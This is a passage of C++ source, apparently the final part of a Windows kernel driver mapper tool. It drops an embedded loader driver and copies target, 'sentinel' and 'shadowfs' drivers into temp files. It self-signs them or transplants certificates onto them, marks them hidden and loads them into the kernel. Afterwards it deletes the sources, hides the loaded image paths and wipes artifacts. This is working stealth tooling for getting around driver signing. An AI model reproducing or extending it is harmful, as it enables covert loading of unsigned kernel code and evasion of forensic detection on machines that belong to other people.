    LOG("Driver temp path: %ls", driverFilePath.c_str());

    if (loaderFilePath.empty() || driverFilePath.empty()) {
        LOG("FATAL: Failed to generate temp file paths");
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }

    LOG("CreateFileW loader_begin path=%ls", loaderFilePath.c_str());
    HANDLE loaderFile = CreateFileW(
        loaderFilePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr
    );

    if (loaderFile == INVALID_HANDLE_VALUE) {
        LOG("FATAL: CreateFileW for loader failed, GLE=%u", GetLastError());
        ReleaseDriverData();
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("CreateFileW loader_ok handle=%p", loaderFile);

    DWORD written = 0;
    DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
    LOG("WriteFile loader_begin bytes=%u", expectedSize);
    BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
    DWORD writeErr = GetLastError();
    FlushFileBuffers(loaderFile);
    CloseHandle(loaderFile);
    LOG("Wrote loader driver: writeOk=%d, written=%u, expected=%u, GLE=%u", writeOk, written, expectedSize, writeErr);

    ReleaseDriverData();

    if (!writeOk || written != expectedSize) {
        LOG("FATAL: Loader driver write failed");
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("Copying target driver from %ls to %ls", driverArg.c_str(), driverFilePath.c_str());
    LOG("CopyFileW target_begin");
    if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
        LOG("FATAL: CopyFileW for target driver failed, GLE=%u", GetLastError());
        Utils::ForceDeleteOrRename(loaderFilePath.c_str());
        if (g_LogFile) fclose(g_LogFile);
        return 1;
    }
    LOG("CopyFileW target_ok");
    LOG("Source target driver retained until post-load cleanup path=%ls", driverArg.c_str());


    std::wstring sentinelFilePath;
    if (!sentinelArg.empty()) {
        sentinelFilePath = Utils::GetSiblingTempFilePath(driverFilePath.c_str(), L".sys");
        LOG("Sentinel temp path: %ls", sentinelFilePath.c_str());
        if (sentinelFilePath.empty()) {
            LOG("FATAL: Failed to generate sentinel temp path");
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("Copying sentinel from %ls to %ls", sentinelArg.c_str(), sentinelFilePath.c_str());
        LOG("CopyFileW sentinel_begin");
        if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
            LOG("FATAL: CopyFileW for sentinel failed, GLE=%u", GetLastError());
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("CopyFileW sentinel_ok");
        LOG("Source sentinel driver retained until post-load cleanup path=%ls", sentinelArg.c_str());

        LOG("Self-signing sentinel driver...");
        if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
            LOG("SelfSignDriver (sentinel) failed, trying TransplantCertificate...");
            SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
        } else {
            LOG("SelfSignDriver (sentinel) OK");
        }
        SetFileAttributesW(sentinelFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
    }

    LOG("Self-signing target driver...");
    if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
        LOG("SelfSignDriver (target) failed, trying TransplantCertificate...");
        SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
    } else {
        LOG("SelfSignDriver (target) OK");
    }

    SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);

    std::wstring shadowFsFilePath;
    if (!shadowFsArg.empty()) {
        shadowFsFilePath = Utils::GetTempFilePath(L".sys");
        LOG("ShadowFS temp path: %ls", shadowFsFilePath.c_str());
        if (shadowFsFilePath.empty()) {
            LOG("FATAL: Failed to generate shadowfs temp path");
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (!sentinelFilePath.empty())
                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("Copying shadowfs from %ls to %ls", shadowFsArg.c_str(), shadowFsFilePath.c_str());
        LOG("CopyFileW shadowfs_begin");
        if (!CopyFileW(shadowFsArg.c_str(), shadowFsFilePath.c_str(), FALSE)) {
            LOG("FATAL: CopyFileW for shadowfs failed, GLE=%u", GetLastError());
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            if (!sentinelFilePath.empty())
                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
            if (g_LogFile) fclose(g_LogFile);
            return 1;
        }
        LOG("CopyFileW shadowfs_ok");
        LOG("Source shadowfs driver retained until post-load cleanup path=%ls", shadowFsArg.c_str());

        LOG("Self-signing shadowfs driver...");
        if (!SignedMemory::SelfSignDriver(shadowFsFilePath.c_str())) {
            LOG("SelfSignDriver (shadowfs) failed, trying TransplantCertificate...");
            SignedMemory::TransplantCertificateToDriver(shadowFsFilePath.c_str());
        } else {
            LOG("SelfSignDriver (shadowfs) OK");
        }
        SetFileAttributesW(shadowFsFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
    }

    LOG("=== Calling WindLoadDriver ===");
    NTSTATUS status = MapperCore::WindLoadDriver(
        loaderFilePath.c_str(),
        driverFilePath.c_str(),
        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str(),
        shadowFsFilePath.empty() ? nullptr : shadowFsFilePath.c_str());
    LOG_STATUS("WindLoadDriver final result", status);

    if (NT_SUCCESS(status)) {
        LOG("SUCCESS - skipping post-load signature file walk for volatile loaded image");
    }

    LOG("Cleaning up temp files...");
    Utils::ForceDeleteOrRename(driverArg.c_str());
    if (!sentinelArg.empty())
        Utils::ForceDeleteOrRename(sentinelArg.c_str());
    if (!shadowFsArg.empty())
        Utils::ForceDeleteOrRename(shadowFsArg.c_str());
    Utils::ForceDeleteOrRename(loaderFilePath.c_str());
    if (NT_SUCCESS(status)) {
        Utils::HideLoadedImagePath(driverFilePath.c_str());
        if (!sentinelFilePath.empty())
            Utils::HideLoadedImagePath(sentinelFilePath.c_str());
        if (!shadowFsFilePath.empty())
            Utils::HideLoadedImagePath(shadowFsFilePath.c_str());
    } else {
        Utils::ForceDeleteOrRename(driverFilePath.c_str());
        if (!sentinelFilePath.empty())
            Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
        if (!shadowFsFilePath.empty())
            Utils::ForceDeleteOrRename(shadowFsFilePath.c_str());
    }

    MapperCore::CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        LOG("=== FINAL: SUCCESS ===");
        LOG("Driver loaded at: %p", g_DriverLoadAddress);
        if (g_SentinelLoadAddress) {
            LOG("Sentinel loaded at: %p, size: 0x%X", g_SentinelLoadAddress, g_SentinelImageSize);
        }
        if (g_DonorCopyPath[0]) {
            LOG("Donor copy: %ls", g_DonorCopyPath);
        }
    } else {
        LOG("=== FINAL: FAILED, status=0x%08X ===", (DWORD)status);
    }

    if (g_LogFile) fclose(g_LogFile);
    return NT_SUCCESS(status) ? 0 : 1;
}
